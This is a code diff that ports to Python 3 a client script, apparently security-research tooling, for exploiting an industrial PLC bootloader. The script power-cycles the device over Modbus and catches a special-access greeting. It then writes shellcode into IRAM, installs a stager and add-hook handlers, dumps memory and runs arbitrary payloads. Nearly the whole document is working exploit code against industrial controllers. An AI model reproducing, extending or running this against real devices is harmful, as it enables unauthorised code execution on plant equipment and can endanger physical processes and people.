@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # Would you please hold my beer while I am cleaning this code?
 # ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin
 
@@ -12,7 +12,7 @@ import subprocess
 import os
 import argparse
 import logging
-from pymodbus.client.sync import ModbusTcpClient
+from pymodbus.client import ModbusTcpClient
 
 from binascii import hexlify
 
@@ -73,36 +73,36 @@ def print_answ(r, answ):
 def calc_checksum_byte(incoming):
     # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
     # Checksum: LSB of negative sum of byte values
-    return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]
+    return struct.pack("<i", -sum(incoming[:incoming[0]]))[0]
 
 def send_packet(r, msg, step=2, sleep_amt=0.01):
     if len(msg) > MAX_MSG_LEN:
         raise ValueError("Message length {} exceeds MAX_MSG_LEN {}".format(len(msg), MAX_MSG_LEN))
     time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
-    msg = chr(len(msg)+1)+msg
-    msg = msg + calc_checksum_byte(msg)
-    log.debug("sending packet: %s", msg.encode("hex"))
+    msg = bytes([len(msg) + 1]) + msg
+    msg = msg + bytes([calc_checksum_byte(msg)])
+    log.debug("sending packet: %s", hexlify(msg))
     for i in range(0, len(msg), step):
         time.sleep(sleep_amt)
         r.send(msg[i:i+step])
 
 def recv_packet(r):
     answ = r.recv(1)
-    rem = ord(answ)
+    rem = answ[0]
     while rem != 0:
         add = r.recv(rem)
         rem -= len(add)
         answ += add
 
     if calc_checksum_byte(answ[:-1]) != answ[-1]:
-        logger.error("Checksum validity failed. Got: {} [{}]".format(answ, answ.encode("hex")))
+        logger.error("Checksum validity failed. Got: %s [%s]", answ, hexlify(answ))
         return None
     else:
         return answ[1:-1]
 
 def recv_many(r, total_bytes=None, baudrate=115200):
     import sys
-    answ = ""
+    answ = b""
     stop = False
     start_time = time.time()
     last_print = 0
@@ -163,11 +163,11 @@ def recv_many(r, total_bytes=None, baudrate=115200):
 
 def encode_packet_for_stager(chunk):
     for i in range(1, 256):
-        if chr(i) not in chunk and i != len(chunk)+2:
+        if i.to_bytes(1, 'big') not in chunk and i != len(chunk)+2:
             log.debug("Sending chunk with xor key: 0x%02x", i)
-            encoded = chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
+            encoded = i.to_bytes(1, 'big') + bytes([b ^ i for b in chunk])
             return encoded
-    logger.error("Could not encode chunk: {}".format(chunk.encode("hex")))
+    logger.error("Could not encode chunk: %s", hexlify(chunk))
     raise ValueError("Could not encode chunk")
 
 def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
@@ -186,9 +186,9 @@ def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
     send_packet(r, encode_packet_for_stager(""))
     answ = recv_packet(r)
 
-def invoke_primary_handler(r, handler_ind, args="", await_response=True):
-    payload = chr(handler_ind)
-    send_packet(r, payload+args)
+def invoke_primary_handler(r, handler_ind, args=b"", await_response=True):
+    payload = bytes([handler_ind])
+    send_packet(r, payload + args)
     if await_response:
         return recv_packet(r)
     else:
@@ -199,17 +199,17 @@ def enter_subproto_handler(r, mode, args=""):
     return invoke_primary_handler(r, 0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))
 
 def leave_subproto_handler(r):
-    send_packet(r, chr(0x81)+"\xD0\x67")
+    send_packet(r, b'\x81\xD0\x67')
     return recv_packet(r)
 
 def subproto_read(r):
-    send_packet(r, chr(0x83))
+    send_packet(r, b'\x83')
     return recv_packet(r)
 
 def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
     if not really:
         raise RuntimeError("Dangerous write attempted without confirmation")
-    send_packet(r, chr(0x84)+"\x5a\x2e"+struct.pack(">I", arg_dw)+add_args, step, sleep_amt)
+    send_packet(r, b'\x84\x5a\x2e' + struct.pack(">I", arg_dw) + add_args, step, sleep_amt)
     return recv_packet(r)
 
 def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
@@ -220,8 +220,8 @@ def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
     if not already_in_80_handler:
         answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
     target_argument = tar-0x10000000
-    answ = _raw_subproto_write(r, target_argument, len(contents)*"\xff", True)
-    if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
+    answ = _raw_subproto_write(r, target_argument, b'\xff' * len(contents), True)
+    if len(contents) == 4 and (contents[:2] in [b'\x00\x00', b'\x0a\x00'] or contents[2:4] in [b'\x00\x00', b'\x0a\x00']):
         answ = _raw_subproto_write(r, target_argument, contents[:2], True)
         answ = _raw_subproto_write(r, target_argument+2, contents[2:4], True)
     else:
@@ -249,33 +249,33 @@ def exploit_write_to_iram(r, tar, contents):
 
 def get_version(r):
     hook_ind = 0
-    send_packet(r, chr(hook_ind))
+    send_packet(r, bytes([hook_ind]))
     answ = recv_packet(r)
     return answ
 
 def bye(r):
     hook_ind = 0xa2
-    send_packet(r, chr(hook_ind))
+    send_packet(r, bytes([hook_ind]))
     answ = recv_packet(r)
-    if answ == "\xa2\x00":
+    if answ == b'\xa2\x00':
         logger.debug("[+] PLC responded to bye() as expected (%s).", repr(answ))
-    elif answ and ord(answ[0]) in range(0x00, 0x80):
-        logger.warning("[!] PLC responded to bye() with handler index: 0x%02x (%s), likely last handler used.", ord(answ[0]), repr(answ))
+    elif answ and answ[0] in range(0x00, 0x80):
+        logger.warning("[!] PLC responded to bye() with handler index: 0x%02x (%s), likely last handler used.", answ[0], repr(answ))
     else:
         logger.warning("[!] Warning: Unexpected response to bye(): %s", repr(answ))
 
-def invoke_add_hook(r, add_hook_no, args="", await_response=True):
+def invoke_add_hook(r, add_hook_no, args=b"", await_response=True):
     assert(0 <= add_hook_no <= 0x20)
     hook_ind = 0x1c
-    args = chr(add_hook_no)+args
+    args = bytes([add_hook_no]) + args
     return invoke_primary_handler(r, hook_ind, args, await_response)
 
 def _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no):
     assert(0 <= add_hook_no <= 0x20)
     if len(shellcode) % 2 != 0:
-        shellcode += "\xff"
+        shellcode += b'\xff'
     exploit_write_to_iram(r, tar_addr, shellcode)
-    exploit_write_to_iram(r, ADD_HOOK_TABLE_START+8*add_hook_no+2, "\x00\xff"+struct.pack(">I", tar_addr))
+    exploit_write_to_iram(r, ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, b'\x00\xff' + struct.pack(">I", tar_addr))
 
 def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
     assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
@@ -287,16 +287,16 @@ def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_A
     send_full_msg_via_stager(r, contents, 8, 0.01)
 
 def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND, payload_manager=None):
-    write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no, "\x00\x00\x00\xff"+struct.pack(">I", tar_addr), stager_addhook_ind)
+    write_via_stager(r, ADD_HOOK_TABLE_START + 8 * add_hook_no, b'\x00\x00\x00\xff' + struct.pack(">I", tar_addr), stager_addhook_ind)
     write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)
     if payload_manager:
         payload_manager.update_next_payload_location(tar_addr, len(shellcode))
     return add_hook_no
 
 def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind, baudrate=115200):
-    answ = invoke_add_hook(r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
+    answ = invoke_add_hook(r, addhook_ind, b'A' + struct.pack(">II", tar_addr, num_bytes))
     log.debug("[payload_dump_mem] answ (len: %d): %s", len(answ), answ)
-    assert(answ.startswith("Ok"))
+    assert(answ.startswith(b'Ok'))
     contents = recv_many(r, total_bytes=num_bytes, baudrate=baudrate)
     return contents
 
@@ -307,7 +307,7 @@ def handle_conn(r, action, args, payload_manager):
 
     for i in range(1):
         version = get_version(r)
-        bootloaderversion = version[2:3]+".".join([str(ord(c)) for c in version[3:-2]])
+        bootloaderversion = version[2:3].decode() + b'.'.join([str(c).encode() for c in version[3:-2]]).decode()
         logger.info('\x1b[6;30;42m[+] Got PLC bootLoader version: ' + bootloaderversion + '\x1b[0m')
 
     # Always install the stager payload
@@ -354,25 +354,25 @@ def handle_conn(r, action, args, payload_manager):
     elif action == ACTION_TIC_TAC_TOE:
         logger.info("[*] Demonstrating Code Execution")
         invoke_add_hook(r, second_addhook_ind, await_response=False)
-        msg = ""
-        END_TOKEN = "==>"
+        msg = b""
+        END_TOKEN = b"==>"
         while END_TOKEN not in msg:
             msg = recv_packet(r)
-            logger.info(msg)
-            if "enter a number" in msg:
-                choice = raw_input()
-                send_packet(r, choice[0])
+            logger.info(msg.decode())
+            if b"enter a number" in msg:
+                choice = input()
+                send_packet(r, choice[0].encode())
         logger.info("[*] Done here!")
 
     logger.info("Saying bye...")
     if getattr(args, "cont", False):
         bye(r)
     else:
-        raw_input("Press to continue loading firmware...")
+        input("Press to continue loading firmware...")
         bye(r)
 
-magic = "MFGT1"
-pad = 4*"A"
+magic = b"MFGT1"
+pad = 4 * b"A"
 
 def switch_power(mode, modbus_ip, modbus_port, modbus_output):
     toggle = True if mode == "on" else False
@@ -422,15 +422,15 @@ def main():
     parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at")
 
     parser_test = subparsers.add_parser(ACTION_TEST)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')
 
     parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
 
     parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                         help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')
 
     args = parser.parse_args()
@@ -468,10 +468,10 @@ def main():
                 answ = s.recv(256, timeout=0.1)
             except Exception:
                 answ = ''
-            if answ and answ.startswith("\5-CPU"):
-                if not answ.startswith("\5-CPU"):
+            if answ and answ.startswith(b"\5-CPU"):
+                if not answ.startswith(b"\5-CPU"):
                     answ += s.recv(256)
-                assert(answ.startswith("\5-CPU"))
+                assert(answ.startswith(b"\5-CPU"))
                 s.unrecv(answ)
                 handshake_received = True
                 logger.info("[+] Special access greeting received!")
